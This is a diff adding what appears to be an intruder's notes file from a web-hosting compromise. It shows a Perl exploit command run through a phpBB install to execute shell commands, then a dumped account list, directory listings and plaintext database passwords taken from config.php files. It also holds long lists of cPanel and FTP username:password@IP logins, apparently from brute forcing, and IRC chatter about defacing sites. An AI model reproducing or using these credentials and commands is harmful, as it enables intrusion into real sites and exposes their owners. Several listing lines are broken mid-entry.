@@ -1,0 +1,335 @@
+http://satu.pelayanweb.com/~imalay/
+http://bambang:bambang@65.254.49.130:2082 << situs kita
+http://kab-pamekasan-gov.com/info.php
+
+$mos_user = focus
+$mospassword = faeez
+http://www.focuslearning.com.my  
+
+
+
+perl wow.pl www.focuslearning.com.my /phpbb/ 2 "ls /var/cpanel/users"
+
+
+
+ lanting:x:32041:543::/home/lanting:/usr/local/cpanel/bin/noshell
+  pmh2002:x:32035:535::/home/pmh2002:/usr/local/cpanel/bin/noshell
+  edutrain:x:32048:550::/home/edutrain:/usr/local/cpanel/bin/noshell
+  kalaman:x:32058:559::/home/kalaman:/usr/local/cpanel/bin/noshell
+  millway:x:32061:562::/home/millway:/usr/local/cpanel/bin/noshell
+  itpn:x:32060:561::/home/itpn:/usr/local/cpanel/bin/noshell
+  zmiey:x:32067:568::/home/zmiey:/usr/local/cpanel/bin/noshell
+  smapk:x:32074:575::/home/smapk/public_html/config.php
+  jhkgroup:x:32077:578::/home/jhkgroup:/usr/local/cpanel/bin/noshell
+  afiqzam:x:32082:583::/home/afiqzam:/usr/local/cpanel/bin/noshell
+  agile:x:32086:587::/home/agile:/usr/local/cpanel/bin/noshell
+  thexp:x:32055:556::/home/thexp:/usr/local/cpanel/bin/noshell
+  viewmy:x:32083:584::/home/viewmy:/usr/local/cpanel/bin/noshell
+
+  totonox:x:32089:591::/home/totonox/public_html/config.php
+ $dbhost = "localhost";
+  $dbuname = "totonox_admin";
+  $dbpass = "ljw@6666";
+  $dbname = "totonox_nuke";
+  $prefix = "nuke";
+  $user_prefix = "nuke";
+  $dbtype = "MySQL";
+
+
+  attunity:x:32090:592::/home/attunity:/usr/local/cpanel/bin/noshell
+  jejaknet:x:32091:593::/home/jejaknet:/usr/local/cpanel/bin/noshell
+
+  sabahan:x:32092:594::/home/sabahan/public_html/config.php
+ $pnconfig['dbtype'] = 'mysql';
+  $pnconfig['dbhost'] = 'localhost';
+  $pnconfig['dbuname'] = 'c2FiYWhhbl93ZWI=';
+  $pnconfig['dbpass'] = 'YWt1MTIz';
+  $pnconfig['dbname'] = 'sabahan_sabah';
+  $pnconfig['system'] = '0';
+  $pnconfig['prefix'] = 'nuke';
+  $pnconfig['encoded'] = '1';
+
+
+  dumei:x:32095:597::/home/dumei/public_html
+
+  iircorp:x:32097:599::/home/iircorp:/usr/local/cpanel/bin/noshell
+
+  peacemy:x:32099:601::/home/peacemy/public_html/config.php
+  $dbhost = "localhost";
+  $dbuname = "peacemy_peace";
+  $dbpass = "qazwsx";
+  $dbname = "peacemy_peacemy1";
+  $prefix = "nuke";
+  $user_prefix = "nuke";
+  $dbtype = "MySQL";
+
+
+  pngdaily:x:32101:603::/home/pngdaily:/usr/local/cpanel/bin/noshell
+  kreatnik:x:32102:604::/home/kreatnik:/usr/local/cpanel/bin/noshell
+
+  mesranet:x:32104:606::/home/mesranet/public_html
+http://www.mesra.net/ringtones/
+ total 30096
+  drwxr-x---    5 mesranet nobody       4096 Nov  4  2003 .
+  drwx--x--x    8 mesranet mesranet     4096 Dec 13 05:43 ..
+  -rw-r--r--    1 mesranet mesranet        0 Apr 26  2003 .htaccess
+  drwxr-xr-x    2 mesranet mesranet     4096 Jan  9  2003 cgi-bin
+  -rw-r--r--    1 mesranet mesranet  4056401 Oct 25  2003 hex.sql
+  -rw-r--r--    1 mesranet mesranet  4056401 Oct 23  2003 hex251003.sql
+  -rw-r--r--    1 mesranet mesranet  6667719 Oct 23  2003 hexreport.sql
+  -rw-r--r--    1 mesranet mesranet      495 Apr 30  2003 index.shtml
+  -rw-r--r--    1 mesranet mesranet   128660 Aug 16  2003 logohex.sql
+  -rwxr-xr-x    1 mesranet mesranet   755400 Nov  2  2003 mesralogo.sql
+  -rw-r--r--    1 mesranet mesranet   459066 Nov  2  2003 mesramessages.sql
+  -rw-r--r--    1 mesranet mesranet  6969607 Nov  4  2003 mesrareport.sql
+  -rw-r--r--    1 mesranet mesranet  1056676 Aug 16  2003 messageshex.sql
+  drwxr-xr-x    5 mesranet mesranet     4096 Nov  4  2003 ringtones
+  -rw-r--r--    1 mesranet mesranet  6563744 Aug 16  2003 ringtones.sql
+  drwxr-xr-x    2 mesranet mesranet     4096 May 30  2003 sms
+ total 8152
+  drwxr-xr-x    5 mesranet mesranet     4096 Nov  4  2003 .
+  drwxr-x---    5 mesranet nobody       4096 Nov  4  2003 ..
+  drwxr-xr-x    2 mesranet mesranet     4096 Apr 26  2003 cgi-bin
+  drwxr-xr-x    2 mesranet mesranet     4096 Jun  3  2003 db
+  -rw-r--r--    1 mesranet mesranet      508 Apr 30  2003 index.html
+  drwxr-xr-x    2 mesranet mesranet     4096 Jul 17  2003 sms
+  -rw-r--r--    1 mesranet mesranet  4154944 Oct 23  2003 sms.tgz
+  -rw-r--r--    1 mesranet mesranet  4155039 Nov  4  2003 smsmesra.tgz
+
+
+  total 32
+  drwxr-xr-x    2 mesranet mesranet     4096 Jun  3  2003 .
+  drwxr-xr-x    5 mesranet mesranet     4096 Nov  4  2003 ..
+  -rw-r--r--    1 mesranet mesranet     7521 Sep  4  2003 admin_add.php
+  -rw-r--r--    1 mesranet mesranet     3009 Sep  4  2003 admin_saved.htm
+  -rw-r--r--    1 mesranet mesranet      333 May 24  2003 connect4.php
+  -rw-r--r--    1 mesranet mesranet     2895 Sep  4  2003 index.htm
+  -rw-r--r--    1 mesranet mesranet     1525 Sep  4  2003 index1.htm
+
+
+
+  mesracom:x:32105:607::/home/mesracom:/usr/local/cpanel/bin/noshell
+  amanmy:x:32106:608::/home/amanmy:/usr/local/cpanel/bin/noshell
+  xpiedu:x:32107:609::/home/xpiedu:/usr/local/cpanel/bin/noshell
+  dotwasia:x:32112:614::/home/dotwasia:/usr/local/cpanel/bin/noshell
+  pnggolf:x:32113:615::/home/
+  1000
+  pnggolf:/usr/local/cpanel/bin/noshell
+  pmium:x:32118:620::/home/pmium:/usr/local/cpanel/bin/noshell
+  qna:x:32121:623::/home/qna:/usr/local/cpanel/bin/noshell
+  veteran:x:32123:625::/home/veteran:/usr/local/cpanel/bin/noshell
+perl wow.pl www.focuslearning.com.my /phpbb/ 2 "ls -la /home/ntv7/public_html"
+
+
+ ntv7:x:32403:905::/home/ntv7:/usr/local/cpanel/bin/noshell
+
+  intim:x:32440:942::/home/intim:/usr/local/cpanel/bin/noshell
+  sscedu:x:32461:963::/home/sscedu:/usr/local/cpanel/bin/noshell
+  rankint:x:32462:964::/home/rankint:/usr/local/cpanel/bin/noshell
+  smoke:x:32487:989::/home/smoke:/usr/local/cpanel/bin/noshell
+
+  igift:x:32490:992::/home/igift/public_html
+
+  klcity:x:32491:993::/home/klcity:/usr/local/cpanel/bin/noshell
+  itravel:x:32492:994::/home/itravel:/usr/local/cpanel/bin/noshell
+  iedu:x:32493:995::/home/iedu:/usr/local/cpanel/bin/noshell
+  iprint:x:32494:996::/home/iprint:/usr/local/cpanel/bin/noshell
+  ifocus:x:32495:997::/home/ifocus:/usr/local/cpanel/bin/noshell
+  ifood:x:32496:998::/home/ifood:/usr/local/cpanel/bin/noshell
+  ifashion:x:32497:999::/home/ifashion:/usr/local/cpanel/bin/noshell
+  ibeauty:x:32498:1000::/home/ibeauty:/usr/local/cpanel/bin/noshell
+  imotor:x:32499:1001::/home/imotor:/usr/local/cpanel/bin/noshell
+  imusic:x:32500:1002::/home/imusic:/usr/local/cpanel/bin/noshell
+  egscom:x:32614:1116::/home/egscom:/bin/false
+  dhyana:x:32024:529::/home/dhyana:/usr/local/cpanel/bin/noshell
+  sdar:x:32535:1037::/home/sdar:/usr/local/cpanel/bin/noshell
+  mymint:x:32615:1117::/home/mymint:/usr/local/cpanel/bin/noshell
+  tamil:x:32616:1118::/home/tamil:/bin/false
+  unilever:x:32617:1119::/home/unilever:/usr/local/cpanel/bin/noshell
+  herman:x:32618:1120::/home/herman:/usr/local/cpanel/bin/noshell
+  senicr:x:32619:1121::/home/senicr:/usr/local/cpanel/bin/noshell
+  uhbself:x:32620:1122::/home/uhbself:/usr/local/cpanel/bin/noshell
+  shmuggle:x:32621:1123::/home/shmuggle:/usr/local/cpanel/bin/noshell
+  wise:x:32622:1124::/home/wise:/usr/local/cpanel/bin/noshell
+  wamad:x:32624:1126::/home/wamad:/usr/local/cpanel/bin/noshell
+  tanjong:x:32625:1127::/home/tanjong:/bin/false
+  icomm:x:32626:1128::/home/icomm:/usr/local/cpanel/bin/noshell
+  shaza:x:32627:1129::/home/shaza:/usr/local/cpanel/bin/noshell
+  anjung:x:32628:1130::/home/anjung:/usr/local/cpanel/bin/noshell
+  lambuk:x:32629:1131::/home/lambuk:/usr/local/cpanel/bin/noshell
+  myios:x:32631:1133::/home/myios:/bin/false
+  comfort:x:32632:1134::/home/comfort:/usr/local/cpanel/bin/noshell
+  sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+  zainul:x:32634:1136::/home/zainul:/bin/bash
+  waja:x:32098:1138::/home/waja:/bin/false
+  oradvd:x:32051:553::/home/oradvd:/usr/local/cpanel/bin/noshell
+  apsbtech:x:32050:1114::/home/apsbtech:/usr/local/cpanel/bin/noshell
+  rodatra:x:32252:1137::/home/rodatra:/usr/local/cpanel/bin/noshell
+  htart:x:32636:1141::/home/htart:/usr/local/cpanel/bin/noshell
+  semetrik:x:32637:1142::/home/semetrik:/usr/local/cpanel/bin/noshell
+  framco:x:32638:1143::/home/framco:/bin/false
+  fakawi:x:32639:1144::/home/fakawi:/usr/local/cpanel/bin/noshell
+  apache:x:48:48:Apache:/var/www:/sbin/nologin
+  squid:x:23:23::/var/spool/squid:/sbin/nologin
+  ptmint:x:32039:541::/home/ptmint:/usr/local/cpanel/bin/noshell
+  smtkt:x:32046:548::/home/smtkt:/usr/local/cpanel/bin/noshell
+  ucuexcel:x:32059:560::/home/ucuexcel:/usr/local/cpanel/bin/noshell
+  pharm88:x:32078:579::/home/pharm88:/usr/local/cpanel/bin/noshell
+  serambi:x:32117:619::/home/serambi:/usr/local/cpanel/bin/noshell
+  shokri:x:32126:628::/home/shokri:/usr/local/cpanel/bin/noshell
+  anugerah:x:32139:641::/home/anugerah:/usr/local/cpanel/bin/noshell
+  ashabulk:x:32141:643::/home/ashabulk:/usr/local/cpanel/bin/noshell
+  sapient:x:32144:646::/home/sapient:/usr/local/cpanel/bin/noshell
+
+  wanita2u:x:32146:648::/home/wanita2u/public_html
+
+  secret:x:32148:650::/home/secret:/usr/local/cpanel/bin/noshell
+
+  rahsiawa:x:32149:651::/home/rahsiawa/public_html
+  $domain         = "www.rahsiawanita.com"; // Your domain name (include www. if used BUT NOT http://)
+  $server         = "localhost"; // Your MySQL server address (usually 'localhost')
+  $db_user        = "rahsiawa_user"; // Your MySQL database username
+  $db_pass        = "rosmini67"; // Your MySQL database password
+  $database       = "rahsiawa_web"; // Your MySQL database name
+  $currency       = "Ringgit Malaysia"; // The currency that your affiliates will be paid in
+  $emailinfo      = "yasir@sumberterbuka.com"; // Your email address
+  $yoursitename   = "Rahsia Wanita"; // Your sites name
+  $language       = "eng.php";  // language of control panel (only eng.php so far)
+
+
+  alwazan:x:32150:652::/home/alwazan:/usr/local/cpanel/bin/noshell
+  gofutsal:x:32152:654::/home/gofutsal:/usr/local/cpanel/bin/jailshell
+  studio:x:32153:655::/home/studio:/usr/local/cpanel/bin/noshell
+  austral:x:32155:657::/home/austral:/usr/local/cpanel/bin/noshell
+  jpnin:x:32156:658::/home/jpnin:/usr/local/cpanel/bin/noshell
+  krepekc:x:32157:659::/home/krepekc:/usr/local/cpanel/bin/noshell
+  malra:x:32161:663::/home/malra:/usr/local/cpanel/bin/noshell
+  sahui:x:32163:665::/home/sahui:/usr/local/cpanel/bin/noshell
+  layman:x:32172:674::/home/layman:/usr/local/cpanel/bin/noshell
+  arckid:x:32174:676::/home/arckid:/usr/local/cpanel/bin/noshell
+  avinashi:x:32175:677::/home/avinashi:/usr/local/cpanel/bin/noshell
+  net4896:x:32185:687::/home/net4896:/usr/local/cpanel/bin/noshell
+  events7:x:32218:720::/home/events7:/usr/local/cpanel/bin/noshell
+  naif:x:32219:721::/home/naif:/usr/local/cpanel/bin/noshell
+  mdbc:x:32222:724::/home/mdbc:/usr/local/cpanel/bin/jailshell
+  legend:x:32223:725::/home/legend:/usr/local/cpanel/bin/noshell
+  ise:x:32224:727::/home/ise:/usr/local/cpanel/bin/noshell
+  utamat:x:32225:728::/home/utamat:/usr/lo
+  2cb
+  cal/cpanel/bin/noshell
+  honey:x:32227:730::/home/honey:/usr/local/cpanel/bin/noshell
+  bukubest:x:32228:731::/home/bukubest:/usr/local/cpanel/bin/noshell
+  anorder:x:32229:732::/home/anorder:/usr/local/cpanel/bin/noshell
+  gtfworld:x:32232:735::/home/gtfworld:/usr/local/cpanel/bin/noshell
+  biosone:x:32226:729::/home/biosone:/usr/local/cpanel/bin/noshell
+  wk.com:x:32235:738::/home/wk.com:/usr/local/cpanel/bin/noshell
+  erlise:x:32004:509::/home/erlise:/usr/local/cpanel/bin/noshell
+  worldrar:x:32009:517::/home/worldrar:/usr/local/cpanel/bin/noshell
+  tomcat:x:101:99::/home/tomcat:/bin/bash
+  aleed:x:32015:521::/home/aleed:/usr/local/cpanel/bin/noshell
+  icci:x:32063:564::/home/icci:/usr/local/cpanel/bin/noshell
+\
+
+
+http://satu.pelayanweb.com/~smapk/
+http://satu.pelayanweb.com/~smapk/log.php
+smapkalumni.org
+$pnconfig['dbtype'] = 'mysql';
+  $pnconfig['dbhost'] = 'localhost';
+  $pnconfig['dbuname'] = 'smapk';
+  $pnconfig['dbpass'] = 'makanbuburayam';
+  $pnconfig['dbname'] = 'smapk_baru';
+  $pnconfig['system'] = '0';
+  $pnconfig['prefix'] = 'smapk';
+  $pnconfig['encoded'] = '0';
+
+broadwaycos.com.my
+k-rise.com.my
+origamione.com.my
+damansaraperdana.com.my
+stonewaylimo.com.my
+
+
+http://biotrend:biotrend@216.218.201.136:2082/
+
+http://bibles:bibles@216.218.201.136:2082/
+
+http://bouras:bouras@216.218.201.136:2082/
+
+http://bridge:bridge@216.218.201.136:2082/
+
+http://brendle:brendle@216.218.201.136:2082/
+
+http://center:center@216.218.201.136:2082/
+
+http://club:club@216.218.201.136:2082/
+
+http://clubloca:clubloca@216.218.201.136:2082/
+
+http://cobraweb:cobraweb@216.218.201.136:2082/
+
+http://color:color@216.218.201.136:2082/
+
+http://corfu:corfu@216.218.201.136:2082/
+
+http://correre:correre@216.218.201.136:2082/
+
+http://cvc:cvc@216.218.201.136:2082/
+
+http://dentis:dentis@216.218.201.136:2082/
+
+http://derma:derma@216.218.201.136:2082/
+
+http://dream:dream@216.218.201.136:2082/
+
+http://dytika:dytika@216.218.201.136:2082/
+
+http://dvdcd:dvdcd@216.218.201.136:2082/
+
+http://elefsina:elefsina@216.218.201.136:2082/
+
+http://harlanov:harlanov@216.218.201.136:2082/
+
+http://hitman:hitman@216.218.201.136:2082/
+
+http://medovar:medovar@216.218.201.136:2082/
+
+http://nadzyie:nadzyie@216.218.201.136:2082/
+
+http://panos:panos@216.218.201.136:2082/
+
+http://skoufa:skoufa@216.218.201.136:2082/
+
+http://teamswoo:teamswoo@216.218.201.136:2082/
+
+http://velyne:velyne@216.218.201.136:2082/
+
+[200]	voiceadm:voiceadm		Proxy: :	http://voiceadm:voiceadm@203.115.228.136:21/
+[200]	hjueduadm:hjueduadm		Proxy: :	http://hjueduadm:hjueduadm@203.115.228.136:21/
+[200]	alcsoadm:alcsoadm		Proxy: :	http://alcsoadm:alcsoadm@203.115.228.136:21/
+[200]	cambodiaadm:cambodiaadm		Proxy: :	http://cambodiaadm:cambodiaadm@203.115.228.136:21/
+[200]	mkbadm:mkbadm		Proxy: :	http://mkbadm:mkbadm@203.115.228.136:21/
+[200]	klpagesadm:klpagesadm		Proxy: :	http://klpagesadm:klpagesadm@203.115.228.136:21/
+[200]	forteadm:forteadm		Proxy: :	http://forteadm:forteadm@203.115.228.136:21/
+[200]	b2cestoreadm:b2cestoreadm		Proxy: :	http://b2cestoreadm:b2cestoreadm@203.115.228.136:21/
+[200]	clinuxadmin:clinuxadmin		Proxy: :	http://clinuxadmin:clinuxadmin@203.115.228.136:21/
+[200]	execadm:execadm		Proxy: :	http://execadm:execadm@203.115.228.136:21/
+
+
+
+ endon yg kene deface sikit gile
+* Antonie- has joined #HackerMalaysia
+ kite dalam kekalahan nih
+ takpa
+ kalah kerr??
+ isk...isk...isk..isk...!!!! 
+ mender war²... duk wak debe lokk
+<`cLaSic`> indonesia berani di dunia maya coba pake senjata takut bah indonesia nya
+
+
+http://www.danyalicious.com/members
+
+Username	daJg8w	Password	2gY4iuWL
+
+
+azsxdc123 << pas kuris
